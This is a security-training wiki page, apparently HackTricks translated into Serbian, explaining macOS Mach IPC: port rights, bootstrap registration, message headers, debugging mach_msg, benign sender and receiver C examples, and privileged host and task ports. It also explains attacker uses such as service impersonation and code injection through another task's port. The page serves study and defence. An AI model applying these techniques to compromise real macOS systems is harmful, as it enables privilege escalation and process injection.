# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach koristi **zadace** kao **najmanju jedinicu** za deljenje resursa, a svaka zadaca može sadržati **više niti**. Ove **zadace i niti su mapirane 1:1 na POSIX procese i niti**.

Komunikacija između zadataka se odvija putem Mach Inter-Process Communication (IPC), koristeći jednosmerne komunikacione kanale. **Poruke se prenose između portova**, koji deluju kao **redovi poruka** kojima upravlja kernel.

**Port** je **osnovni** element Mach IPC. Može se koristiti za **slanje poruka i njihovo primanje**.

Svaki proces ima **IPC tabelu**, u kojoj je moguće pronaći **mach portove procesa**. Ime mach porta je zapravo broj (pokazivač na kernel objekat).

Proces takođe može poslati ime porta sa nekim pravima **drugoj zadaci** i kernel će učiniti da se ovaj unos u **IPC tabeli druge zadatke** pojavi.

### Port Rights

Prava portova, koja definišu koje operacije zadatak može izvesti, ključna su za ovu komunikaciju. Moguća **prava portova** su ([definicije ovde](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Pravo na primanje**, koje omogućava primanje poruka poslatih na port. Mach portovi su MPSC (više proizvođača, jedan potrošač) redovi, što znači da može postojati samo **jedno pravo na primanje za svaki port** u celom sistemu (za razliku od cevi, gde više procesa može imati deskriptore datoteka za kraj čitanja jedne cevi).
- **Zadaca sa pravom na primanje** može primati poruke i **kreirati prava na slanje**, omogućavajući joj da šalje poruke. Prvobitno samo **vlastita zadaca ima pravo na primanje nad svojim portom**.
- Ako vlasnik prava na primanje **umre** ili ga ubije, **pravo na slanje postaje beskorisno (mrtvo ime).**
- **Pravo na slanje**, koje omogućava slanje poruka na port.
- Pravo na slanje može biti **klonirano** tako da zadaca koja poseduje pravo na slanje može klonirati pravo i **dodeliti ga trećoj zadaci**.
- Imajte na umu da se **prava portova** takođe mogu **proslediti** putem Mach poruka.
- **Pravo na slanje jednom**, koje omogućava slanje jedne poruke na port i zatim nestaje.
- Ovo pravo **ne može** biti **klonirano**, ali može biti **premesto**.
- **Pravo na skup portova**, koje označava _skup portova_ umesto jednog porta. Uklanjanje poruke iz skupa portova uklanja poruku iz jednog od portova koje sadrži. Skupovi portova mogu se koristiti za slušanje na nekoliko portova istovremeno, slično kao `select`/`poll`/`epoll`/`kqueue` u Unixu.
- **Mrtvo ime**, koje nije stvarno pravo portova, već samo mesto za rezervaciju. Kada se port uništi, sva postojeća prava portova na port postaju mrtva imena.

**Zadace mogu prenositi PRAVA NA SLANJE drugima**, omogućavajući im da šalju poruke nazad. **PRAVA NA SLANJE se takođe mogu klonirati, tako da zadaca može duplicirati i dati pravo trećoj zadaci**. Ovo, u kombinaciji sa posredničkim procesom poznatim kao **bootstrap server**, omogućava efikasnu komunikaciju između zadataka.

### File Ports

File portovi omogućavaju enkapsulaciju deskriptora datoteka u Mac portovima (koristeći prava Mach portova). Moguće je kreirati `fileport` iz datog FD koristeći `fileport_makeport` i kreirati FD iz fileporta koristeći `fileport_makefd`.

### Establishing a communication

Kao što je ranije pomenuto, moguće je slati prava koristeći Mach poruke, međutim, **ne možete poslati pravo bez već imanja prava** da pošaljete Mach poruku. Dakle, kako se uspostavlja prva komunikacija?

Za to je uključen **bootstrap server** (**launchd** u mac), jer **svako može dobiti PRAVO NA SLANJE na bootstrap server**, moguće je zatražiti od njega pravo da pošalje poruku drugom procesu:

1. Zadaca **A** kreira **novi port**, dobijajući **PRAVO NA PRIMANJE** nad njim.
2. Zadaca **A**, kao nosilac prava na primanje, **generiše PRAVO NA SLANJE za port**.
3. Zadaca **A** uspostavlja **vezu** sa **bootstrap serverom**, i **šalje mu PRAVO NA SLANJE** za port koji je generisala na početku.
- Zapamtite da svako može dobiti PRAVO NA SLANJE na bootstrap server.
4. Zadaca A šalje `bootstrap_register` poruku bootstrap serveru da **poveže dati port sa imenom** kao što je `com.apple.taska`
5. Zadaca **B** komunicira sa **bootstrap serverom** da izvrši bootstrap **pretragu za uslugu** imenom (`bootstrap_lookup`). Tako da bootstrap server može odgovoriti, zadaca B će mu poslati **PRAVO NA SLANJE na port koji je prethodno kreirala** unutar poruke za pretragu. Ako je pretraga uspešna, **server duplicira PRAVO NA SLANJE** primljeno od Zadace A i **prenosi ga Zadaci B**.
- Zapamtite da svako može dobiti PRAVO NA SLANJE na bootstrap server.
6. Sa ovim PRAVOM NA SLANJE, **Zadaca B** je sposobna da **pošalje** **poruku** **Zadaci A**.
7. Za dvosmernu komunikaciju obično zadaca **B** generiše novi port sa **PRAVOM NA PRIMANJE** i **PRAVOM NA SLANJE**, i daje **PRAVO NA SLANJE Zadaci A** kako bi mogla slati poruke Zadaci B (dvosmerna komunikacija).

Bootstrap server **ne može autentifikovati** ime usluge koje tvrdi zadaca. To znači da bi **zadaca** mogla potencijalno **imitirati bilo koju sistemsku zadacu**, kao što je lažno **tvrđenje o imenu usluge za autorizaciju** i zatim odobravanje svake zahteve.

Zatim, Apple čuva **imena usluga koje obezbeđuje sistem** u sigurnim konfiguracionim datotekama, smeštenim u **SIP-zaštićenim** direktorijumima: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Pored svakog imena usluge, **pridruženi binarni fajl se takođe čuva**. Bootstrap server će kreirati i zadržati **PRAVO NA PRIMANJE za svako od ovih imena usluga**.

Za ove unapred definisane usluge, **proces pretrage se malo razlikuje**. Kada se ime usluge pretražuje, launchd pokreće uslugu dinamički. Novi radni tok je sledeći:

- Zadaca **B** pokreće bootstrap **pretragu** za ime usluge.
- **launchd** proverava da li zadaca radi i ako ne, **pokreće** je.
- Zadaca **A** (usluga) vrši **bootstrap prijavu** (`bootstrap_check_in()`). Ovde, **bootstrap** server kreira PRAVO NA SLANJE, zadržava ga i **prenosi PRAVO NA PRIMANJE Zadaci A**.
- launchd duplicira **PRAVO NA SLANJE i šalje ga Zadaci B**.
- Zadaca **B** generiše novi port sa **PRAVOM NA PRIMANJE** i **PRAVOM NA SLANJE**, i daje **PRAVO NA SLANJE Zadaci A** (usluga) kako bi mogla slati poruke Zadaci B (dvosmerna komunikacija).

Međutim, ovaj proces se primenjuje samo na unapred definisane sistemske zadace. Ne-sistemske zadace i dalje funkcionišu kao što je prvobitno opisano, što bi potencijalno moglo omogućiti imitaciju.

> [!CAUTION]
> Stoga, launchd nikada ne bi trebao da se sruši ili će ceo sistem pasti.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Funkcija `mach_msg`, koja je u suštini sistemski poziv, koristi se za slanje i primanje Mach poruka. Funkcija zahteva da poruka bude poslata kao početni argument. Ova poruka mora početi sa `mach_msg_header_t` strukturom, nakon koje sledi stvarni sadržaj poruke. Struktura je definisana kao follows:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Procesi koji poseduju _**receive right**_ mogu primati poruke na Mach portu. Nasuprot tome, **pošiljaocima** se dodeljuju _**send**_ ili _**send-once right**_. Send-once right je isključivo za slanje jedne poruke, nakon čega postaje nevažeći.

Početno polje **`msgh_bits`** je bitmapa:

- Prvi bit (najznačajniji) se koristi za označavanje da je poruka složena (više o tome u nastavku)
- 3. i 4. bit koriste kernel
- **5 najmanje značajnih bitova 2. bajta** može se koristiti za **voucher**: još jedan tip porta za slanje kombinacija ključ/vrednost.
- **5 najmanje značajnih bitova 3. bajta** može se koristiti za **local port**
- **5 najmanje značajnih bitova 4. bajta** može se koristiti za **remote port**

Tipovi koji se mogu specificirati u voucheru, lokalnim i udaljenim portovima su (iz [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Na primer, `MACH_MSG_TYPE_MAKE_SEND_ONCE` može se koristiti da **naznači** da bi **send-once** **pravo** trebalo da bude izvedeno i preneseno za ovu portu. Takođe se može odrediti `MACH_PORT_NULL` da se spreči da primalac može da odgovori.

Da bi se postigla laka **dvosmerna komunikacija**, proces može da odredi **mach port** u mach **header-u poruke** nazvanom _reply port_ (**`msgh_local_port`**) gde **primalac** poruke može da **pošalje odgovor** na ovu poruku.

> [!TIP]
> Imajte na umu da se ova vrsta dvosmerne komunikacije koristi u XPC porukama koje očekuju odgovor (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Ali **obično se kreiraju različiti portovi** kao što je objašnjeno ranije da bi se stvorila dvosmerna komunikacija.

Ostala polja header-a poruke su:

- `msgh_size`: veličina celog paketa.
- `msgh_remote_port`: port na kojem je ova poruka poslata.
- `msgh_voucher_port`: [mach vaučeri](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: ID ove poruke, koji tumači primalac.

> [!CAUTION]
> Imajte na umu da se **mach poruke šalju preko `mach port`**, koji je **jedan primalac**, **više pošiljalaca** komunikacioni kanal ugrađen u mach kernel. **Više procesa** može **slati poruke** na mach port, ali u bilo kojem trenutku samo **jedan proces može čitati** iz njega.

Poruke se formiraju sa **`mach_msg_header_t`** header-om praćenim **telom** i **trailer-om** (ako postoji) i može dati dozvolu za odgovor na nju. U tim slučajevima, kernel samo treba da prenese poruku iz jednog zadatka u drugi.

**Trailer** je **informacija dodata poruci od strane kernela** (ne može je postaviti korisnik) koja se može zatražiti prilikom prijema poruke sa zastavicama `MACH_RCV_TRAILER_<trailer_opt>` (postoji različite informacije koje se mogu zatražiti).

#### Kompleksne Poruke

Međutim, postoje i druge **kompleksne** poruke, poput onih koje prenose dodatna prava na port ili dele memoriju, gde kernel takođe treba da pošalje te objekte primaocu. U tim slučajevima, najznačajnija bit header-a `msgh_bits` je postavljena.

Mogući deskriptori za prenos su definisani u [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
U 32 bita, svi deskriptori su 12B, a tip deskriptora je u 11. bajtu. U 64 bita, veličine variraju.

> [!CAUTION]
> Jezgro će kopirati deskriptore iz jednog zadatka u drugi, ali prvo **stvarajući kopiju u kernel memoriji**. Ova tehnika, poznata kao "Feng Shui", je zloupotrebljena u nekoliko eksploata kako bi se **kernelu naložilo da kopira podatke u svoju memoriju**, omogućavajući procesu da šalje deskriptore samom sebi. Tada proces može primati poruke (kernel će ih osloboditi).
>
> Takođe je moguće **poslati prava na port ranjivom procesu**, a prava na port će se jednostavno pojaviti u procesu (čak i ako ih ne obrađuje).

### Mac Ports APIs

Napomena: portovi su povezani sa imenskim prostorom zadatka, tako da se za kreiranje ili pretraživanje porta takođe upitkuje imenski prostor zadatka (više u `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Kreiraj** port.
- `mach_port_allocate` takođe može kreirati **port set**: pravo prijema nad grupom portova. Kada se poruka primi, označava se port iz kojeg je došla.
- `mach_port_allocate_name`: Promeni ime porta (po defaultu 32bitni ceo broj)
- `mach_port_names`: Dobij imena portova iz cilja
- `mach_port_type`: Dobij prava zadatka nad imenom
- `mach_port_rename`: Preimenuj port (poput dup2 za FD-ove)
- `mach_port_allocate`: Alociraj novi RECEIVE, PORT_SET ili DEAD_NAME
- `mach_port_insert_right`: Kreiraj novo pravo u portu gde imaš RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funkcije koje se koriste za **slanje i primanje mach poruka**. Verzija za prepisivanje omogućava da se odredi drugačiji bafer za prijem poruka (druga verzija će samo ponovo koristiti isti).

### Debug mach_msg

Pošto su funkcije **`mach_msg`** i **`mach_msg_overwrite`** one koje se koriste za slanje i primanje poruka, postavljanje tačke prekida na njih omogućava inspekciju poslatih i primljenih poruka.

Na primer, počnite da debagujete bilo koju aplikaciju koju možete debagovati jer će učitati **`libSystem.B` koja će koristiti ovu funkciju**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Da biste dobili argumente **`mach_msg`**, proverite registre. Ovo su argumenti (iz [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Preuzmite vrednosti iz registrija:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Proverite zaglavlje poruke proveravajući prvi argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Ova vrsta `mach_msg_bits_t` je veoma uobičajena za omogućavanje odgovora.

### Enumerate ports
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**Ime** je podrazumevano ime dato portu (proverite kako se **povećava** u prva 3 bajta). **`ipc-object`** je **obfuskovani** jedinstveni **identifikator** porta.\
Takođe obratite pažnju na to kako portovi sa samo **`send`** pravima **identifikuju vlasnika** (ime porta + pid).\
Takođe obratite pažnju na upotrebu **`+`** da označite **druge zadatke povezane sa istim portom**.

Takođe je moguće koristiti [**procesxp**](https://www.newosxbook.com/tools/procexp.html) da se vide i **registrovana imena usluga** (sa onemogućenim SIP-om zbog potrebe za `com.apple.system-task-port`):
```
procesp 1 ports
```
Možete instalirati ovaj alat na iOS preuzimanjem sa [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Primer koda

Obratite pažnju na to kako **pošiljalac** **dodeljuje** port, kreira **pravo slanja** za ime `org.darlinghq.example` i šalje ga **bootstrap serveru** dok je pošiljalac tražio **pravo slanja** tog imena i koristio ga za **slanje poruke**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privilegovani Portovi

Postoje neki posebni portovi koji omogućavaju **izvršavanje određenih osetljivih akcija ili pristup određenim osetljivim podacima** u slučaju da zadaci imaju **SEND** dozvole nad njima. Ovo čini ove portove veoma zanimljivim iz perspektive napadača, ne samo zbog mogućnosti, već i zato što je moguće **deliti SEND dozvole između zadataka**.

### Host Posebni Portovi

Ovi portovi su predstavljeni brojem.

**SEND** prava se mogu dobiti pozivanjem **`host_get_special_port`** i **RECEIVE** prava pozivanjem **`host_set_special_port`**. Međutim, oba poziva zahtevaju **`host_priv`** port koji može pristupiti samo root. Štaviše, u prošlosti je root mogao da pozove **`host_set_special_port`** i preuzme proizvoljan port, što je omogućavalo, na primer, zaobilaženje potpisivanja koda preuzimanjem `HOST_KEXTD_PORT` (SIP sada to sprečava).

Ovi portovi su podeljeni u 2 grupe: **prvih 7 portova je u vlasništvu kernela**, a to su 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` i 7 je `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Oni koji počinju **od** broja **8** su **u vlasništvu sistemskih demona** i mogu se naći deklarisani u [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: Ako proces ima **SEND** privilegiju nad ovim portom, može dobiti **informacije** o **sistemu** pozivajući njegove rutine kao što su:
- `host_processor_info`: Dobijanje informacija o procesoru
- `host_info`: Dobijanje informacija o hostu
- `host_virtual_physical_table_info`: Virtuelna/Fizička tabela stranica (zahteva MACH_VMDEBUG)
- `host_statistics`: Dobijanje statistike hosta
- `mach_memory_info`: Dobijanje rasporeda memorije kernela
- **Host Priv port**: Proces sa **SEND** pravom nad ovim portom može izvršiti **privilegovane akcije** kao što su prikazivanje podataka o pokretanju ili pokušaj učitavanja ekstenzije kernela. **Proces mora biti root** da bi dobio ovu dozvolu.
- Štaviše, da bi pozvao **`kext_request`** API, potrebno je imati druge privilegije **`com.apple.private.kext*`** koje se daju samo Apple binarnim datotekama.
- Druge rutine koje se mogu pozvati su:
- `host_get_boot_info`: Dobijanje `machine_boot_info()`
- `host_priv_statistics`: Dobijanje privilegovanih statistika
- `vm_allocate_cpm`: Alokacija Kontinuirane Fizičke Memorije
- `host_processors`: Slanje prava host procesorima
- `mach_vm_wire`: Učiniti memoriju rezidentnom
- Kako **root** može pristupiti ovoj dozvoli, može pozvati `host_set_[special/exception]_port[s]` da **preuzme host posebne ili izuzetne portove**.

Moguće je **videti sve host posebne portove** pokretanjem:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

Ovo su portovi rezervisani za dobro poznate usluge. Mogu se dobiti/postaviti pozivom `task_[get/set]_special_port`. Mogu se naći u `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
- **TASK_KERNEL_PORT**\[task-self send right]: Port koji se koristi za kontrolu ovog zadatka. Koristi se za slanje poruka koje utiču na zadatak. Ovo je port koji vraća **mach_task_self (vidi Task Ports ispod)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Bootstrap port zadatka. Koristi se za slanje poruka koje zahtevaju vraćanje drugih portova sistemskih usluga.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Port koji se koristi za zahtev informacija o hostu koji sadrži. Ovo je port koji vraća **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Port koji imenuje izvor iz kojeg ovaj zadatak crpi svoju fiksnu kernel memoriju.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Port koji imenuje izvor iz kojeg ovaj zadatak crpi svoju podrazumevanu upravljanu memoriju.

### Task Ports

Prvobitno, Mach nije imao "procese", imao je "zadate" koje su se smatrale više kao kontejner niti. Kada je Mach spojen sa BSD **svaki zadatak je bio povezan sa BSD procesom**. Stoga svaki BSD proces ima detalje koji su mu potrebni da bude proces, a svaki Mach zadatak takođe ima svoje unutrašnje funkcionisanje (osim za nepostojeći pid 0 koji je `kernel_task`).

Postoje dve veoma zanimljive funkcije povezane sa ovim:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Dobijanje SEND prava za port zadatka koji je povezan sa onim koji je specificiran `pid` i dodeljivanje tog prava naznačenom `target_task_port` (koji je obično zadatak pozivaoca koji je koristio `mach_task_self()`, ali može biti i SEND port preko drugog zadatka).
- `pid_for_task(task, &pid)`: Dajući SEND pravo zadatku, pronaći kojem PID-u je ovaj zadatak povezan.

Da bi se izvršavale radnje unutar zadatka, zadatak je trebao `SEND` pravo za sebe pozivajući `mach_task_self()` (koji koristi `task_self_trap` (28)). Sa ovom dozvolom zadatak može izvršiti nekoliko radnji kao što su:

- `task_threads`: Dobijanje SEND prava nad svim portovima zadatka niti zadatka
- `task_info`: Dobijanje informacija o zadatku
- `task_suspend/resume`: Suspendovanje ili nastavak zadatka
- `task_[get/set]_special_port`
- `thread_create`: Kreiranje niti
- `task_[get/set]_state`: Kontrola stanja zadatka
- i više se može naći u [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Imajte na umu da sa SEND pravom nad portom zadatka **drugog zadatka**, moguće je izvršiti takve radnje nad drugim zadatkom.

Pored toga, task_port je takođe **`vm_map`** port koji omogućava **čitanje i manipulaciju memorijom** unutar zadatka sa funkcijama kao što su `vm_read()` i `vm_write()`. Ovo u osnovi znači da zadatak sa SEND pravima nad task_port-om drugog zadatka može **ubaciti kod u taj zadatak**.

Zapamtite da zato što je **kernel takođe zadatak**, ako neko uspe da dobije **SEND dozvole** nad **`kernel_task`**, moći će da natera kernel da izvrši bilo šta (jailbreak).

- Pozovite `mach_task_self()` da **dobijete ime** za ovaj port za zadatak pozivaoca. Ovaj port se samo **nasleđuje** preko **`exec()`**; novi zadatak kreiran sa `fork()` dobija novi port zadatka (kao poseban slučaj, zadatak takođe dobija novi port zadatka nakon `exec()` u suid binarnom). Jedini način da se pokrene zadatak i dobije njegov port je da se izvrši ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) dok se radi `fork()`.
- Ovo su ograničenja za pristup portu (iz `macos_task_policy` iz binarnog `AppleMobileFileIntegrity`):
- Ako aplikacija ima **`com.apple.security.get-task-allow` pravo** procesi iz **iste korisničke grupe mogu pristupiti portu zadatka** (obično dodato od strane Xcode-a za debagovanje). Proces **notarizacije** neće to dozvoliti za produkcijske verzije.
- Aplikacije sa **`com.apple.system-task-ports`** pravom mogu dobiti **port zadatka za bilo koji** proces, osim kernela. U starijim verzijama to se zvalo **`task_for_pid-allow`**. Ovo se dodeljuje samo Apple aplikacijama.
- **Root može pristupiti portovima zadataka** aplikacija **koje nisu** kompajlirane sa **hardened** runtime-om (i ne od Apple-a).

